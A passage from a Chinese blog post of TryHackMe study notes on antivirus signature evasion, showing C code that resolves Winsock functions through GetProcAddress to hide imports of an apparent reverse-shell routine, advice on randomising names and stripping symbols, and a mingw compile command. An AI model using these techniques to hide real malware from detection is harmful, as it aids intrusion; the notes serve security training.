class="keyword">typedef</span> <span class="title function_">u_short</span><span class="params">(WSAAPI* HTONS)</span><span class="params">(u_short hostshort)</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span><span class="params">(WSAAPI* WSACONNECT)</span><span class="params">(SOCKET s,<span class="type">const</span> <span class="keyword">struct</span> sockaddr *name,<span class="type">int</span> namelen,LPWSABUF lpCallerData,LPWSABUF lpCalleeData,LPQOS lpSQOS,LPQOS lpGQOS)</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span><span class="params">(WSAAPI* CLOSESOCKET)</span><span class="params">(SOCKET s)</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span><span class="params">(WSAAPI* WSACLEANUP)</span><span class="params">(<span class="type">void</span>)</span>;</span><br></pre></td></tr></tbody></table></figure>

<p>下面的代码片段定义了与上述结构相对应的所有所需的指针地址。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line">HMODULE hws2_32 = LoadLibraryW(<span class="string">L"ws2_32"</span>);</span><br><span class="line">WSASTARTUP myWSAStartup = (WSASTARTUP) GetProcAddress(hws2_32, <span class="string">"WSAStartup"</span>);</span><br><span class="line">WSASOCKETA myWSASocketA = (WSASOCKETA) GetProcAddress(hws2_32, <span class="string">"WSASocketA"</span>);</span><br><span class="line">INET_ADDR myinet_addr = (INET_ADDR) GetProcAddress(hws2_32, <span class="string">"inet_addr"</span>);</span><br><span class="line">HTONS myhtons = (HTONS) GetProcAddress(hws2_32, <span class="string">"htons"</span>);</span><br><span class="line">WSACONNECT myWSAConnect = (WSACONNECT) GetProcAddress(hws2_32, <span class="string">"WSAConnect"</span>);</span><br><span class="line">CLOSESOCKET myclosesocket = (CLOSESOCKET) GetProcAddress(hws2_32, <span class="string">"closesocket"</span>);</span><br><span class="line">WSACLEANUP myWSACleanup = (WSACLEANUP) GetProcAddress(hws2_32, <span class="string">"WSACleanup"</span>); </span><br></pre></td></tr></tbody></table></figure>

<p>请注意，结构定义应该位于代码开头的任何函数之外。 指针定义应该位于“RunShell”函数的顶部</p>
<p>我们现在应该以适当的最佳实践随机化指针和其他变量名称。 我们还应该删除二进制文件中的任何符号或其他可识别信息。</p>
<p>一旦彻底混淆并删除信息，我们就可以使用“mingw-gcc”编译二进制文件。</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">x86_64-w64-mingw32-gcc challenge.c -o challenge.exe -lwsock32 -lws2_32 </span><br></pre></td></tr></tbody></table></figure></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://mikannse.space">Mikannse</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://mikannse.space/2024/04/09/THM%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0SignatureEvasion/">http://mikannse.space/2024/04/09/THM免杀学习SignatureEvasion/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://mikannse.space" target="_blank">MikannseのSekai</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%AC%94%E8%AE%B0/">笔记</a><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><a class="post-meta__tags" href="/tags/%E5%85%8D%E6%9D%80/">免杀</a></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/04/12/THM%E5%9F%9F%E5%AD%A6%E4%B9%A0ActiveDirectoryBasics/" title="THM域学习ActiveDirectoryBasics"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">THM域学习ActiveDirectoryBasics</div></div></a></div><div class="next-post pull-right"><a href="/2024/04/08/THM%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0ObfuscationPrinciples/" title="THM免杀学习ObfuscationPrinciples"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">THM免杀学习ObfuscationPrinciples</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2024/08/11/THM%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0EvadingLoggingandMonitoring/" title="THM免杀学习EvadingLoggingandMonitoring"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-11</div><div class="title">THM免杀学习EvadingLoggingandMonitoring</div></div></a></div><div><a href="/2024/04/08/THM%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0AVEvasionShellcode/" title="THM免杀学习AVEvasionShellcode"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-08</div><div class="title">THM免杀学习AVEvasionShellcode</div></div></a></div><div><a href="/2024/04/08/THM%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0IntroductiontoAntivirus/" title="THM免杀学习IntroductiontoAntivirus"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-08</div><div class="title">THM免杀学习IntroductiontoAntivirus</div></div></a></div><div><a href="/2024/08/11/THM%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0RuntimeDetectionEvasion/" title="THM免杀学习RuntimeDetectionEvasion"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-08-11</div><div class="title">THM免杀学习RuntimeDetectionEvasion</div></div></a></div><div><a href="/2024/04/08/THM%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0ObfuscationPrinciples/" title="THM免杀学习ObfuscationPrinciples"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-08</div><div class="title">THM免杀学习ObfuscationPrinciples</div></div></a></div><div><a href="/2024/06/15/AdvancedSQLInjectionTHM/" title="AdvancedSQLInjectionTHM"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-15</div><div class="title">AdvancedSQLInjectionTHM</div></div></a></div></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Mikannse</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">312</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">74</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/mikannse/mikannse.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">暂时没有公告QAQ</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Introduction"><span class="toc-number">1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Signature-Identification"><span class="toc-number">2.</span> <span class="toc-text">Signature Identification</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Automating-Signature-Identification"><span class="toc-number">3.</span> <span class="toc-text">Automating Signature Identification</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ThreatCheck"><span class="toc-number">3.0.1.</span> <span class="toc-text">ThreatCheck</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AMSITrigger"><span class="toc-number">3.0.2.</span> <span class="toc-text">AMSITrigger</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Static-Code-Based-Signatures"><span class="toc-number">4.</span> <span class="toc-text">Static Code-Based Signatures</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E5%89%B2%E5%92%8C%E5%90%88%E5%B9%B6%E5%AF%B9%E8%B1%A1"><span class="toc-number">4.0.1.</span> <span class="toc-text">分割和合并对象</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A0%E9%99%A4%E5%92%8C%E9%9A%90%E8%97%8F%E5%8F%AF%E8%AF%86%E5%88%AB%E4%BF%A1%E6%81%AF"><span class="toc-number">4.0.2.</span> <span class="toc-text">删除和隐藏可识别信息</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Static-Property-Based-Signatures"><span class="toc-number">5.</span> <span class="toc-text">Static Property-Based Signatures</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%93%88%E5%B8%8C%E5%80%BC"><span class="toc-number">5.0.1.</span> <span class="toc-text">文件哈希值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Entropy"><span class="toc-number">5.0.2.</span> <span class="toc-text">Entropy</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Behavioral-Signatures"><span class="toc-number">6.</span> <span class="toc-text">Behavioral Signatures</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Putting-It-All-Together"><span class="toc-number">7.</span> <span class="toc-text">Putting It All Together</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/21/Wiki.js%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E9%83%A8%E7%BD%B2%E5%8F%8Anginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E9%85%8D%E7%BD%AE/" title="Wiki.js云服务器部署及nginx反向代理配置">Wiki.js云服务器部署及nginx反向代理配置</a><time datetime="2024-12-21T03:20:41.000Z" title="发表于 2024-12-21 11:20:41">2024-12-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/17/Python3%E7%88%AC%E8%99%AB%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0%E7%AC%AC%E4%BA%94%E7%AB%A0Ajax%E6%95%B0%E6%8D%AE%E7%88%AC%E5%8F%96/" title="Python3爬虫开发笔记第五章Ajax数据爬取">Python3爬虫开发笔记第五章Ajax数据爬取</a><time datetime="2024-12-17T13:56:19.000Z" title="发表于 2024-12-17 21:56:19">2024-12-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/14/Python3%E7%88%AC%E8%99%AB%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0%E7%AC%AC%E5%9B%9B%E7%AB%A0%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8/" title="Python3爬虫开发笔记第四章数据存储">Python3爬虫开发笔记第四章数据存储</a><time datetime="2024-12-14T15:40:04.000Z" title="发表于 2024-12-14 23:40:04">2024-12-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/14/Python3%E7%88%AC%E8%99%AB%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0%E7%AC%AC%E4%B8%89%E7%AB%A0%E8%A7%A3%E6%9E%90%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/" title="Python3爬虫开发笔记第三章解析库的使用">Python3爬虫开发笔记第三章解析库的使用</a><time datetime="2024-12-14T06:33:42.000Z" title="发表于 2024-12-14 14:33:42">2024-12-14</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/12/07/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E5%85%AD%E4%B8%83)%E4%B9%8BVulnHubDeathNote/" title="打靶记录(一六七)之VulnHubDeathNote">打靶记录(一六七)之VulnHubDeathNote</a><time datetime="2024-12-07T09:05:21.000Z" title="发表于 2024-12-07 17:05:21">2024-12-07</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://cdn.jsdelivr.net/gh/yjr-1100/Photobag/githubioimg/background_4k.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2024 By Mikannse</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '',
      appKey: '',
      avatar: 'monsterid',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !true) {
  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script><script>function loadDisqus () {
  const disqus_config = function () {
    this.page.url = 'http://mikannse.space/2024/04/09/THM%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0SignatureEvasion/'
    this.page.identifier = '/2024/04/09/THM%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0SignatureEvasion/'
    this.page.title = 'THM免杀学习SignatureEvasion'
  }

  const disqusReset = () => {
    DISQUS.reset({
      reload: true,
      config: disqus_config
    })
  }

  btf.addModeChange('disqus', disqusReset)

  if (window.DISQUS) disqusReset()
  else {
    (function() { 
      var d = document, s = d.createElement('script');
      s.src = 'https://.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  }
}

if ('Valine' === 'Disqus' || !true) {
  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
  else loadDisqus()
} else {
  function loadOtherComment () {
    loadDisqus()
  }
}
</script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {

  // removeEventListener scroll 
  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)

  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')

  typeof disqusjs === 'object' && disqusjs.destroy()
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', (e) => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div class="no-result" id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>